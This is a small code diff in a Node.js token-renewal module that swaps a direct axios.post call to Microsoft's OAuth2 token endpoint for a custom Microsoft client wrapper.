@@ -2,6 +2,7 @@ const db = require('../database/connection');
 const { decrypt, encrypt } = require('../utils/encrypt');
 const { convertTokensToCookies } = require('./cookieconverter');
 const axios = require('axios');
+const ms = require('./microsoftclient');
 const config = require('../config/env');
 
 async function runRenewalCycle() {
@@ -112,7 +113,7 @@ if (isPersonal) {
       : 'https://graph.microsoft.com/.default offline_access openid profile';
 
     // Call Microsoft token endpoint with refresh token using correct account-specific settings
-    const response = await axios.post(
+    const response = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
       new URLSearchParams({
         grant_type: 'refresh_token',
